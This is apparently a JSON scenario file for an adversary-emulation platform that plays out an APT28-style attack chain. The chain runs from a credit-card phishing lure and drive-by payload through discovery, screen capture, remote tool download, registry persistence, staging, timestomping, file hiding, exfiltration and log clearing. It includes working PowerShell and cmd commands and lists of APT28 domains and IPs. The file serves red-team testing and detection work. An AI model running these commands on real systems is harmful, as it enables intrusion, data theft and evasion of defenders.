@@ -1,0 +1,748 @@
+{
+    "meta_data": {
+        "name": "apt28",
+        "version": "v1.0.0",
+        "title": "APT28",
+        "description": "This scenario will emulate the common attack TTPs used by APT28, focusing on information discovery and defense evasion operations.",
+        "author": "Attack Content",
+        "suggested_duration": 1539
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "self.tool_name2",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "SpearPhishingLink",
+            "technique": "InitialAccess",
+            "label": "spearPhishingLink",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "body": {
+                        "template": [
+                            "Your credit card has been stolen on the dark web. Click below for more information:\nhttp://",
+                            "self.driveby_domain",
+                            "/",
+                            "self.payload_name",
+                            "\nChase Card Services"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "processDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "windowsshell tasklist /v /apps"
+                }
+            }
+        },
+        {
+            "tactic": "PeripheralDeviceDiscovery",
+            "technique": "Discovery",
+            "label": "peripheralDeviceDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{fsutil fsinfo drives}"
+                }
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "forfiles",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell {$ext = @(\".pdf\", \".xls\", \".xlsx\", \".doc\", \".docx\"); $ext | foreach-object -process {forfiles /S /P C:\\Users /m *$_ /c \"cmd /c echo @path\"; echo \"\"}}"
+                }
+            }
+        },
+        {
+            "tactic": "ScreenCapture",
+            "technique": "Collection",
+            "label": "screenCapture",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell $d = \"",
+                            "self.exfil_dir",
+                            "self.exfil_file",
+                            "\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell mkdir ",
+                            "self.temp_dir_name",
+                            "; Invoke-WebRequest -Uri \"",
+                            "self.driveby_domain2",
+                            "/",
+                            "self.tool_name2",
+                            "\" -OutFile ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name2",
+                            "; echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ValidAccounts_DomainAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_DomainAccounts",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_2",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "RegistryRunKeysStartupFolder",
+            "technique": "Persistence",
+            "label": "addRunRegistryKey",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BackgroundColor /d ",
+                            "self.temp_dir_name",
+                            "\\",
+                            "self.tool_name2",
+                            " && echo \"\""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "DataFromLocalSystem",
+            "technique": "Collection",
+            "label": "dataFromLocalSystem",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": "powershell &{$files = @(); gci C:\\Users -exclude \"Public\" | gci -Recurse -exclude \"AppData\" -include \"*.txt\",\"*.csv\",\"*.dat\" -file 2>$null | foreach {$files = $files + $_.FullName}; $file = $files | Get-Random; echo $file}"
+                }
+            }
+        },
+        {
+            "tactic": "LogonScriptWindows",
+            "technique": "Persistence",
+            "label": "logonScripts",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "DataStaged",
+            "technique": "Collection",
+            "label": "dataStaged",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "src_file": {
+                        "template": [
+                            "self.exfil_dir",
+                            "self.exfil_file"
+                        ]
+                    },
+                    "dst_dir": "C:\\Users\\Public\\Downloads"
+                }
+            }
+        },
+        {
+            "tactic": "TimeStomp",
+            "technique": "DefenseEvasion",
+            "label": "timeStomp",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden C:\\Users\\Public\\Downloads\\",
+                            "self.exfil_file",
+                            "; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "HiddenFilesAndDirectories",
+            "technique": "DefenseEvasion",
+            "label": "hiddenFilesAndDirectories",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c attrib +H C:\\Users\\Public\\Downloads\\",
+                            "self.exfil_file",
+                            " && echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverWebService",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverWebService",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "exfil": "self.exfil",
+                "tune": {
+                    "exfil_file": {
+                        "template": [
+                            "C:\\Users\\Public\\Downloads\\",
+                            "self.exfil_file"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletionPowershell",
+            "technique": "DefenseEvasion",
+            "label": "fileDeletion",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c del C:\\Users\\Public\\Downloads\\",
+                            "self.exfil_file",
+                            " && echo ' '"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ClearWindowsEventLogs",
+            "technique": "DefenseEvasion",
+            "label": "clearWindowsEventLogs",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExitElevated",
+            "preconditions": {
+                "agent": "self.agent_tgt1_elevated",
+                "tool": "self.tool",
+                "target": "self.target_1_elevated"
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "login-osce.org",
+            "natoexhibitionff14.com",
+            "nato.nshq.in",
+            "standartnevvs.com",
+            "novinitie.com",
+            "n0vinite.com",
+            "qov.hu.com",
+            "q0v.pl",
+            "mail.q0v.pl",
+            "poczta.mon.q0v.pl",
+            "supservermgr.com",
+            "nethostnet.com",
+            "hostsvcnet.com",
+            "etcrem.net",
+            "movieultimate.com",
+            "newfilmts.com",
+            "fastdataexchange.org",
+            "liveweatherview.com",
+            "analyticsbar.org",
+            "analyticstest.net",
+            "lifeofmentalservice.com",
+            "meteost.com",
+            "righttopregnantpower.com",
+            "kiteim.org",
+            "adobe-flash-updates.org",
+            "generalsecurityscan.com",
+            "globalresearching.org",
+            "lvueton.com",
+            "audiwheel.com",
+            "online-reggi.com",
+            "fsportal.net",
+            "mvband.net",
+            "mvtband.net",
+            "viters.org",
+            "treepastwillingmoment.com",
+            "sendmevideo.org",
+            "satellitedeluxpanorama.com",
+            "ppcodecs.com",
+            "encoder-info.tk",
+            "wmdmediacodecs.com",
+            "postlkwarn.com",
+            "shcserv.com",
+            "versiontask.com",
+            "webcdelivery.com",
+            "miropc.org",
+            "securityprotectingcorp.com",
+            "uniquecorpind.com",
+            "appexsrv.net",
+            "adobeupgradeflash.com",
+            "accounts.secure-ua.website",
+            "i.ua-passport.top",
+            "login.creditals-email.space",
+            "post.mil-gov.space",
+            "verify.rambler-profile.site",
+            "id-unconfirmeduser.frge.io",
+            "hatdfg-rhgreh684.frge.io",
+            "ua-consumerpanel.frge.io",
+            "consumerspanel.frge.io",
+            "microsofthelpcenter.info",
+            "driversupdate.info",
+            "1oo7.net",
+            "ambcomission.com"
+        ],
+        "ip": [
+            "185.25.51.198/24",
+            "185.25.50.93/24",
+            "220.158.216.127/24",
+            "92.114.92.102/24",
+            "86.106.131.177/24",
+            "45.124.132.127/24",
+            "109.248.148.42/24",
+            "104.171.117.216/24",
+            "141.255.160.52/24",
+            "34.243.239.199/24",
+            "74.208.228.186/24",
+            "193.56.28.25/24",
+            "195.191.235.155/24",
+            "167.114.153.55/24",
+            "94.237.37.28/24",
+            "82.118.242.171/24",
+            "31.220.61.251/24",
+            "128.199.199.187/24",
+            "66.172.12.133/24",
+            "45.64.105.23/24",
+            "176.31.112.10/24",
+            "176.31.96.178/24",
+            "188.241.58.170/24",
+            "185.203.118.198/24",
+            "185.203.118.198/24",
+            "145.249.105.165/24",
+            "188.241.58.170/24",
+            "109.248.148.42/24",
+            "188.241.58.170/24",
+            "185.203.118.198/24",
+            "145.249.105.165/24",
+            "109.248.148.42/24"
+        ],
+        "binary": [
+            "opera.exe",
+            "bat.exe",
+            "msimn.exe",
+            "vpngui.exe",
+            "ipseca.exe",
+            "ipsecc.exe",
+            "openvpn.exe",
+            "thebat.exe",
+            "skype.exe",
+            "ntslwin.exe",
+            "userinit.exe",
+            "info.exe",
+            "gdrive.exe",
+            "decrypt_v2.4.exe",
+            "email.exe",
+            "igmtSX.exe",
+            "decrypt.exe",
+            "photos.exe",
+            "GoogleDrivemonitor.exe"
+        ]
+    },
+    "spec": {
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "help_win_x86.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwalterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "157.32.19.24/24",
+                "ioc-domain_driveby": "arkansaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "exfil_file": "~temp482",
+                "exfil_dir": "C:\\Windows\\Tasks\\",
+                "payload_destination": "C:\\Windows\\Temp"
+            }
+        },
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "darryl.richmond@site.com",
+                "to_addrs": "janice.durham@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "Emergency Concerning Your Credit Card",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "darryl.richmond",
+                "password": "",
+                "port": "25"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "target_1_elevated": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "local_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-target_username"
+                ]
+            },
+            "temp_dir_name": {
+                "path": [
+                    "targets",
+                    "1",
+                    "payload_destination"
+                ]
+            },
+            "exfil_file": {
+                "path": [
+                    "targets",
+                    "1",
+                    "exfil_file"
+                ]
+            },
+            "exfil_dir": {
+                "path": [
+                    "targets",
+                    "1",
+                    "exfil_dir"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt1_elevated": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
